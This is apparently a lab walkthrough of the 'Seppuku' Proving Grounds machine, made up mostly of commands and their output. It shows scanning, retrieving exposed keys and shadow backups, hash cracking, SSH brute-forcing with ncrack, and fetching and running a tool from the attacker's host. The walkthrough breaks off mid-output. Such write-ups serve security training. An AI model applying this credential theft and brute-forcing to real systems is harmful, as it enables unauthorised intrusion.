# Recon

```console
root@kali:/OSCPv3/offsec_pg/Seppuku# nmap -Pn -sT -sV -n 192.168.135.90 -p- --reason --min-rate 1000 --max-retries 2 
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-18 23:47 CST
Warning: 192.168.135.90 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.135.90
Host is up, received user-set (0.11s latency).
Not shown: 62781 closed ports, 2746 filtered ports
Reason: 62781 conn-refused and 2746 no-responses
PORT     STATE SERVICE       REASON  VERSION
21/tcp   open  ftp           syn-ack vsftpd 3.0.3
22/tcp   open  ssh           syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http          syn-ack nginx 1.14.2
139/tcp  open  netbios-ssn   syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn   syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
7080/tcp open  ssl/empowerid syn-ack LiteSpeed
7601/tcp open  http          syn-ack Apache httpd 2.4.38 ((Debian))
8088/tcp open  http          syn-ack LiteSpeed httpd
Service Info: Host: SEPPUKU; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.92 seconds
```

## TCP/21/FTP

```console
root@kali:/OSCPv3/offsec_pg/Seppuku# ftp 192.168.135.90
Connected to 192.168.135.90.
220 (vsFTPd 3.0.3)
Name (192.168.135.90:root): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> exit
221 Goodbye.
```

```console
root@kali:/OSCPv3/offsec_pg/Seppuku# searchsploit vsftpd
-------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                |  Path
-------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption                                                | linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)                                                | windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)                                                | windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                                                                              | linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                        | unix/remote/17491.rb
-------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

```console
root@kali:/OSCPv3/offsec_pg/Seppuku# nmap -sV --script "vuln" -p 21 192.168.135.90
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-18 23:53 CST
Nmap scan report for 192.168.135.90
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_sslv2-drown: 
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.29 seconds
```



## SMB TCP/139, TCp/445/

```console
root@kali:/OSCPv3/offsec_pg/Seppuku# nmap -sV --script "vuln" -p 139,445 192.168.135.90
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-18 23:55 CST
Nmap scan report for 192.168.135.90
Host is up (0.11s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: SEPPUKU

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: false
| smb-vuln-regsvc-dos: 
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_          

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.20 seconds
```

```console
root@kali:/OSCPv3/offsec_pg/Seppuku# smbmap -H 192.168.135.90 -u ""
[+] Finding open SMB ports....
[+] User SMB session establishd on 192.168.135.90...
[+] IP: 192.168.135.90:445	Name: 192.168.135.90                                    
	Disk                                                  	Permissions
	----                                                  	-----------
	print$                                            	NO ACCESS
	IPC$                                              	NO ACCESS
```

```console
root@kali:/OSCPv3/offsec_pg/Seppuku# nmap -Pn -sT -n --script smb-enum-shares.nse 192.168.135.90 -p 139,445
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-18 23:58 CST
Nmap scan report for 192.168.135.90
Host is up (0.11s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\192.168.135.90\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (Samba 4.9.5-Debian)
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\192.168.135.90\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 12.07 seconds
```

```console
root@kali:/OSCPv3/offsec_pg/Seppuku# smbclient -L 192.168.135.90 -N 
WARNING: The "syslog" option is deprecated

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            SEPPUKU
``` 

```console
root@kali:/OSCPv3/offsec_pg/Seppuku# smbclient //192.168.135.90/IPC$ -N 
WARNING: The "syslog" option is deprecated
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
smb: \> ls
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
smb: \> dir ../
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \
smb: \> exit
```

```console
root@kali:/OSCPv3/offsec_pg/Seppuku# smbclient //192.168.135.90/print$ -N 
WARNING: The "syslog" option is deprecated
tree connect failed: NT_STATUS_ACCESS_DENIED
root@kali:/OSCPv3/offsec_pg/Seppuku# smbclient //192.168.135.90/print$ -N -m SMB2
WARNING: The "syslog" option is deprecated
tree connect failed: NT_STATUS_ACCESS_DENIED
``` 

```console
root@kali:/OSCPv3/offsec_pg/Seppuku# crackmapexec smb 192.168.135.90 -u '' -p ''
CME          192.168.135.90:445 SEPPUKU         [*] Windows 6.1 Build 0 (name:SEPPUKU) (domain:SEPPUKU)
CME          192.168.135.90:445 SEPPUKU         [+] SEPPUKU\: 
[*] KTHXBYE!
```

```console
root@kali:/OSCPv3/offsec_pg/Seppuku# mount -t cifs //192.168.135.90/IPC$ tmp -o username=null,password=null,domain=WORKGROUP
mount: /OSCPv3/offsec_pg/Seppuku/tmp: special device //192.168.135.90/IPC$ does not exist.
root@kali:/OSCPv3/offsec_pg/Seppuku# mount -t cifs //192.168.135.90/print$ tmp -o username=null,password=null,domain=WORKGROUP
mount: /OSCPv3/offsec_pg/Seppuku/tmp: cannot mount //192.168.135.90/print$ read-only.
``` 


```console
root@kali:/OSCPv3/offsec_pg/Seppuku# nmap -p 445 192.168.135.90 --script smb-ls --script-args 'share=IPC$'
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-19 00:10 CST
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 0.00% done
Nmap scan report for 192.168.135.90
Host is up (0.11s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 1.71 seconds
```


```console
root@kali:/OSCPv3/offsec_pg/Seppuku# nmap -p 445 192.168.135.90 --script smb-ls --script-args 'share=print$,path=C:\var\lib\samba\printers'
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-19 00:11 CST
Nmap scan report for 192.168.135.90
Host is up (0.11s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 1.58 seconds
root@kali:/OSCPv3/offsec_pg/Seppuku# nmap -p 445 192.168.135.90 --script smb-ls --script-args 'share=print$,path=/var/lib/samba/printers'
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-19 00:11 CST
Nmap scan report for 192.168.135.90
Host is up (0.11s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 1.56 seconds
```


```console
root@kali:/OSCPv3/offsec_pg/Seppuku# searchsploit Samba 4.
-------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                |  Path
-------------------------------------------------------------------------------------------------------------- ---------------------------------
Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                  | osx/remote/9924.rb
Samba 2.2.8 (Linux Kernel 2.6 / Debian / Mandrake) - Share Privilege Escalation                               | linux/local/23674.txt
Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                                              | linux/remote/364.pl
Samba 3.4.16/3.5.14/3.6.4 - SetInformationPolicy AuditEventsInfo Heap Overflow (Metasploit)                   | linux/remote/21850.rb
Samba 3.4.5 - Symlink Directory Traversal                                                                     | linux/remote/33599.txt
Samba 3.4.5 - Symlink Directory Traversal (Metasploit)                                                        | linux/remote/33598.rb
Samba 3.4.7/3.5.1 - Denial of Service                                                                         | linux/dos/12588.txt
Samba 3.5.0 < 4.4.14/4.5.10/4.6.4 - 'is_known_pipename()' Arbitrary Module Load (Metasploit)                  | linux/remote/42084.rb
Samba 3.5.11/3.6.3 - Remote Code Execution                                                                    | linux/remote/37834.py
Samba 3.5.22/3.6.17/4.0.8 - nttrans Reply Integer Overflow                                                    | linux/dos/27778.txt
Samba 4.5.2 - Symlink Race Permits Opening Files Outside Share Directory                                      | multiple/remote/41740.txt
Sambar FTP Server 6.4 - 'SIZE' Remote Denial of Service                                                       | windows/dos/2934.php
Sambar Server 4.1 Beta - Admin Access                                                                         | cgi/remote/20570.txt
Sambar Server 4.2 Beta 7 - Batch CGI                                                                          | windows/remote/19761.txt
Sambar Server 4.3/4.4 Beta 3 - Search CGI                                                                     | windows/remote/20223.txt
Sambar Server 4.4/5.0 - 'pagecount' File Overwrite                                                            | multiple/remote/21026.txt
Sambar Server 4.x/5.0 - Insecure Default Password Protection                                                  | multiple/remote/21027.txt
Sambar Server 5.x - Information Disclosure                                                                    | windows/remote/22434.txt
Sambar Server 5.x/6.0/6.1 - 'results.stm' indexname Cross-Site Scripting                                      | windows/remote/25694.txt
Sambar Server 6.0 - 'results.stm' POST Buffer Overflow                                                        | windows/dos/23664.py
-------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

## HTTP TCP/80

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Seppuku/img/1.png)

## HTTP TCP/8088 - LiteSpeed

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Seppuku/img/2.png)

```console
root@kali:/OSCPv3/offsec_pg/Seppuku# curl http://192.168.135.90:8088
<body oncontextmenu="return false;">
<html>
<head>
<title>Seppuku</title>
</head>
<body bgcolor="#FFFFFF">
<center>
<img src="Seppuku.jpg" class="center" align="center" >
```

```console
root@kali:/OSCPv3/offsec_pg/Seppuku# nmap -Pn -sT -sV --script http-enum 192.168.135.90 -p 8088
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-19 00:18 CST
Stats: 0:02:08 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.67% done; ETC: 00:20 (0:00:03 remaining)
Stats: 0:03:21 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.67% done; ETC: 00:21 (0:00:05 remaining)
Nmap scan report for 192.168.135.90
Host is up (0.11s latency).

PORT     STATE SERVICE VERSION
8088/tcp open  http    LiteSpeed httpd
|_http-server-header: LiteSpeed

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 296.36 seconds
```

```console
root@kali:/OSCPv3/offsec_pg/Seppuku# dirb http://192.168.135.90:8088/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Nov 19 00:37:06 2021
URL_BASE: http://192.168.135.90:8088/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.135.90:8088/ ----
==> DIRECTORY: http://192.168.135.90:8088/blocked/                                                                                             
==> DIRECTORY: http://192.168.135.90:8088/cgi-bin/                                                                                             
==> DIRECTORY: http://192.168.135.90:8088/docs/                                                                                                
+ http://192.168.135.90:8088/index.html (CODE:200|SIZE:171)                                                                                    
+ http://192.168.135.90:8088/index.php (CODE:200|SIZE:163188)                                                                                  
                                                                                                                                               
---- Entering directory: http://192.168.135.90:8088/blocked/ ----
(!) WARNING: All responses for this directory seem to be CODE = 403.                                                                           
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                               
---- Entering directory: http://192.168.135.90:8088/cgi-bin/ ----
                                                                                                                                               
---- Entering directory: http://192.168.135.90:8088/docs/ ----
==> DIRECTORY: http://192.168.135.90:8088/docs/css/                                                                                            
==> DIRECTORY: http://192.168.135.90:8088/docs/img/                                                                                            
+ http://192.168.135.90:8088/docs/index.html (CODE:200|SIZE:5472)                                                                              
                                                                                                                                               
---- Entering directory: http://192.168.135.90:8088/docs/css/ ----
^C> Testing: http://192.168.135.90:8088/docs/css/skin1_original                                                                                
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Seppuku/img/11.png)

```console
root@kali:/OSCPv3/offsec_pg/Seppuku/secret# curl -L http://192.168.135.90:8088/docs | grep OpenLiteSpeed
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1260  100  1260    0     0   5971      0 --:--:-- --:--:-- --:--:--  5943
100  5472  100  5472    0     0   <title>OpenLiteSpeed Users' Manual - Home</title>
   <meta name="description" content="OpenLiteSpeed Users' Manual - Home." />
17  <h3 class="ls-text-thin">OpenLiteSpeed Web Server <span class="current"><a href="index.html"> Users' Manual</a></span></h3>
261      0 --:--:-- --:--:-- --:--:-- 17261
    <h1>OpenLiteSpeed Web Server 1.6</h1>
<p>For more information, visit our <a href="https://openlitespeed.org/kb/">OpenLiteSpeed Knowledge Base</a></p>
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Seppuku/img/10.png)

```console
root@kali:/OSCPv3/offsec_pg/Seppuku/secret# searchsploit OpenLiteSpeed
-------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                |  Path
-------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenLitespeed 1.3.9 - Use-After-Free (Denial of Service)                                                      | linux/dos/37051.c
-------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

```console
root@kali:/OSCPv3/offsec_pg/Seppuku# python3 /opt/dirsearch/dirsearch.py -u http://192.168.135.90:8088 -e php,txt,xml,html

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, txt, xml, html | HTTP method: get | Threads: 10 | Wordlist size: 7139

Error Log: /opt/dirsearch/logs/errors-21-11-19_01-13-55.log

Target: http://192.168.135.90:8088

[01:13:56] Starting: 
[01:13:57] 400 -    1KB - /%2e%2e/google.com
[01:14:29] 301 -    1KB - /cgi-bin  ->  http://192.168.135.90:8088/cgi-bin/
[01:14:36] 200 -    5KB - /docs/
[01:14:36] 301 -    1KB - /docs  ->  http://192.168.135.90:8088/docs/
[01:14:45] 200 -  171B  - /index.html
[01:14:46] 200 -  159KB - /index.php
[01:14:46] 200 -  159KB - /index.php/login/

Task Completed
```


## HTTP TCP/7601


```console
root@kali:/OSCPv3/offsec_pg/Seppuku# dirb http://192.168.135.90:7601/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Nov 19 00:24:00 2021
URL_BASE: http://192.168.135.90:7601/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.135.90:7601/ ----
==> DIRECTORY: http://192.168.135.90:7601/a/                                                                                                   
==> DIRECTORY: http://192.168.135.90:7601/b/                                                                                                   
==> DIRECTORY: http://192.168.135.90:7601/c/                                                                                                   
==> DIRECTORY: http://192.168.135.90:7601/ckeditor/                                                                                            
==> DIRECTORY: http://192.168.135.90:7601/d/                                                                                                   
==> DIRECTORY: http://192.168.135.90:7601/database/                                                                                            
==> DIRECTORY: http://192.168.135.90:7601/e/                                                                                                   
==> DIRECTORY: http://192.168.135.90:7601/f/                                                                                                   
==> DIRECTORY: http://192.168.135.90:7601/h/                                                                                                   
+ http://192.168.135.90:7601/index.html (CODE:200|SIZE:171)                                                                                    
==> DIRECTORY: http://192.168.135.90:7601/keys/                                                                                                
==> DIRECTORY: http://192.168.135.90:7601/production/                                                                                          
==> DIRECTORY: http://192.168.135.90:7601/q/                                                                                                   
==> DIRECTORY: http://192.168.135.90:7601/r/                                                                                                   
==> DIRECTORY: http://192.168.135.90:7601/secret/                                                                                              
+ http://192.168.135.90:7601/server-status (CODE:403|SIZE:281)                                                                                 
==> DIRECTORY: http://192.168.135.90:7601/t/                                                                                                   
==> DIRECTORY: http://192.168.135.90:7601/w/                                                                                                   
                                                                                                                                               
---- Entering directory: http://192.168.135.90:7601/a/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                               
---- Entering directory: http://192.168.135.90:7601/b/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                               
---- Entering directory: http://192.168.135.90:7601/c/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                               
---- Entering directory: http://192.168.135.90:7601/ckeditor/ ----
==> DIRECTORY: http://192.168.135.90:7601/ckeditor/ckeditor/                                                                                   
==> DIRECTORY: http://192.168.135.90:7601/ckeditor/css/                                                                                        
^C> Testing: http://192.168.135.90:7601/ckeditor/explore
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Seppuku/img/3.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Seppuku/img/5.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Seppuku/img/6.png)


```console
root@kali:/OSCPv3/offsec_pg/Seppuku/keys# wget http://192.168.135.90:7601/keys/private
--2021-11-19 00:39:48--  http://192.168.135.90:7601/keys/private
Conectando con 192.168.135.90:7601... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 1680 (1,6K)
Grabando a: “private”

private                             100%[===================================================================>]   1,64K  --.-KB/s    en 0s      

2021-11-19 00:39:48 (197 MB/s) - “private” guardado [1680/1680]
```

```console
root@kali:/OSCPv3/offsec_pg/Seppuku/keys# wget http://192.168.135.90:7601/keys/private.bak
--2021-11-19 00:40:07--  http://192.168.135.90:7601/keys/private.bak
Conectando con 192.168.135.90:7601... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 1680 (1,6K) [application/x-trash]
Grabando a: “private.bak”

private.bak                         100%[===================================================================>]   1,64K  --.-KB/s    en 0s      

2021-11-19 00:40:07 (210 MB/s) - “private.bak” guardado [1680/1680]
```

```console
root@kali:/OSCPv3/offsec_pg/Seppuku/keys# ssh -i private seppuku@192.168.135.90
The authenticity of host '192.168.135.90 (192.168.135.90)' can't be established.
ECDSA key fingerprint is SHA256:RltTwzbYqqcBz4/ww5KEokNttE+fZwM7l4bvzFaf558.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.135.90' (ECDSA) to the list of known hosts.
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'private' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "private": bad permissions
seppuku@192.168.135.90's password: 

root@kali:/OSCPv3/offsec_pg/Seppuku/keys# ssh -i private.bak seppuku@192.168.135.90
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'private.bak' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "private.bak": bad permissions
seppuku@192.168.135.90's password: 
Permission denied, please try again.
seppuku@192.168.135.90's password: 

root@kali:/OSCPv3/offsec_pg/Seppuku/keys#
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Seppuku/img/7.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Seppuku/img/8.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Seppuku/img/9.png)

```console
root@kali:/OSCPv3/offsec_pg/Seppuku/secret# wget http://192.168.135.90:7601/secret/passwd.bak
--2021-11-19 00:43:49--  http://192.168.135.90:7601/secret/passwd.bak
Conectando con 192.168.135.90:7601... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 2801 (2,7K) [application/x-trash]
Grabando a: “passwd.bak”

passwd.bak                          100%[===================================================================>]   2,74K  --.-KB/s    en 0s      

2021-11-19 00:43:49 (311 MB/s) - “passwd.bak” guardado [2801/2801]
```

```console
root@kali:/OSCPv3/offsec_pg/Seppuku/secret# wget http://192.168.135.90:7601/secret/password.lst
--2021-11-19 00:44:04--  http://192.168.135.90:7601/secret/password.lst
Conectando con 192.168.135.90:7601... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 672
Grabando a: “password.lst”

password.lst                        100%[===================================================================>]     672  --.-KB/s    en 0s      

2021-11-19 00:44:04 (54,0 MB/s) - “password.lst” guardado [672/672]
```

```console
root@kali:/OSCPv3/offsec_pg/Seppuku/secret# wget http://192.168.135.90:7601/secret/shadow.bak
--2021-11-19 00:44:17--  http://192.168.135.90:7601/secret/shadow.bak
Conectando con 192.168.135.90:7601... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 1448 (1,4K) [application/x-trash]
Grabando a: “shadow.bak”

shadow.bak                          100%[===================================================================>]   1,41K  --.-KB/s    en 0s      

2021-11-19 00:44:17 (192 MB/s) - “shadow.bak” guardado [1448/1448]
```

```console
root@kali:/OSCPv3/offsec_pg/Seppuku/secret# ls
passwd.bak  password.lst  passwords  shadow.bak
root@kali:/OSCPv3/offsec_pg/Seppuku/secret# more passwd.bak 
rabbit-hole:x:1001:1001:,,,:/home/rabbit-hole:/bin/bash
root@kali:/OSCPv3/offsec_pg/Seppuku/secret# more shadow.bak 
rabbit-hole:$6$2/SxUdFc$Es9XfSBlKCG8fadku1zyt/HPTYz3Rj7m4bRzovjHxX4WmIMO7rz4j/auR/V.yCPy2MKBLBahX29Y3DWkR6oT..:18395:0:99999:7:::
root@kali:/OSCPv3/offsec_pg/Seppuku/secret# unshadow passwd.bak shadow.bak > passwords
root@kali:/OSCPv3/offsec_pg/Seppuku/secret# cat passwords 
rabbit-hole:$6$2/SxUdFc$Es9XfSBlKCG8fadku1zyt/HPTYz3Rj7m4bRzovjHxX4WmIMO7rz4j/auR/V.yCPy2MKBLBahX29Y3DWkR6oT..:1001:1001:,,,:/home/rabbit-hole:/bin/bash
```
```console
root@kali:/OSCPv3/offsec_pg/Seppuku/secret# john passwords --wordlist password.lst 
Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
Use the "--format=crypt" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Press 'q' or Ctrl-C to abort, almost any other key for status
a1b2c3           (rabbit-hole)
1g 0:00:00:00 DONE (2021-11-19 00:52) 5.000g/s 320.0p/s 320.0c/s 320.0C/s 123456..green
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```console
root@kali:/OSCPv3/offsec_pg/Seppuku/secret# ssh rabbit-hole@192.168.135.90
rabbit-hole@192.168.135.90's password: 
Permission denied, please try again.
rabbit-hole@192.168.135.90's password: 
Permission denied, please try again.
rabbit-hole@192.168.135.90's password: 
rabbit-hole@192.168.135.90: Permission denied (publickey,password).
```

```console
root@kali:/OSCPv3/offsec_pg/Seppuku/secret# ssh -i ../keys/private rabbit-hole@192.168.135.90
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for '../keys/private' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "../keys/private": bad permissions
rabbit-hole@192.168.135.90's password: 
```

```console
root@kali:/OSCPv3/offsec_pg/Seppuku/secret# chmod 644 ../keys/private.bak 
root@kali:/OSCPv3/offsec_pg/Seppuku/secret# ssh -i ../keys/private.bak rabbit-hole@192.168.135.90
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for '../keys/private.bak' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "../keys/private.bak": bad permissions
rabbit-hole@192.168.135.90's password: 
Permission denied, please try again.
rabbit-hole@192.168.135.90's password: 

root@kali:/OSCPv3/offsec_pg/Seppuku/secret# 
```

```console
root@kali:/OSCPv3/offsec_pg/Seppuku/w# wget http://192.168.135.90:7601/w/password.lst
--2021-11-19 01:35:04--  http://192.168.135.90:7601/w/password.lst
Conectando con 192.168.135.90:7601... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 672
Grabando a: “password.lst”

password.lst                             100%[================================================================================>]     672  --.-KB/s    en 0s      

2021-11-19 01:35:04 (86,6 MB/s) - “password.lst” guardado [672/672]
```

# Explotation

```console
root@kali:/OSCPv3/offsec_pg/Seppuku/w# ncrack -u seppuku -P password.lst -v ssh://192.168.135.90

Starting Ncrack 0.6 ( http://ncrack.org ) at 2021-11-19 01:35 CST

Discovered credentials on ssh://192.168.135.90:22 'seppuku' 'eeyoree'
ssh://192.168.135.90:22 finished.

Discovered credentials for ssh on 192.168.135.90 22/tcp:
192.168.135.90 22/tcp ssh: 'seppuku' 'eeyoree'

Ncrack done: 1 service scanned in 45.01 seconds.
Probes sent: 34 | timed-out: 0 | prematurely-closed: 9

Ncrack finished.
root@kali:/OSCPv3/offsec_pg/Seppuku/w#
```

```console
root@kali:/OSCPv3/offsec_pg/Seppuku/w# ssh seppuku@192.168.135.90
seppuku@192.168.135.90's password: 
Linux seppuku 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
seppuku@seppuku:~$ whoami
seppuku
``` 


```console
seppuku@seppuku:~$ ls
local.txt
seppuku@seppuku:~$ cat local.txt 
c2d9d3daec7512b3547083ae8b7df678
seppuku@seppuku:~$ pwd
/home/seppuku
```

```console
seppuku@seppuku:~$ cat .passwd 
12345685213456!@!@A
```



# Privilege Escalation

```console
seppuku@seppuku:/tmp$ nano process.sh

#!/bin/bash

# Loop by line
IFS=$'\n'

old_process=$(ps -eo command)

while true; do
	new_process=$(ps -eo command)
	diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]
	sleep 1
	old_process=$new_process
done
```
```console
seppuku@seppuku:/tmp$ chmod +x process.sh 
seppuku@seppuku:/tmp$ ./process.sh 
< [kworker/0:1-events_power_efficient]
> [kworker/0:1-events]
< [kworker/u2:2-events_unbound]
> [kworker/u2:2-flush-8:0]
< [kworker/u2:2-flush-8:0]
> [kworker/u2:2-events_unbound]
....
....

```

```console
seppuku@seppuku:/tmp$ wget http://192.168.49.66:9000/pspy64s
--2021-11-20 00:58:35--  http://192.168.49.66:9000/pspy64s
Connecting to 192.168.49.66:9000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1156536 (1.1M) [application/octet-stream]
Saving to: 'pspy64s'

pspy64s                                  100%[================================================================================>]   1.10M  95.7KB/s    in 12s     

2021-11-20 00:58:48 (95.9 KB/s) - 'pspy64s' saved [1156536/1156536]

seppuku@seppuku:/tmp$ chmod +x pspy64s 
```
```console
seppuku@seppuku:/tmp$ ./pspy64s 
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
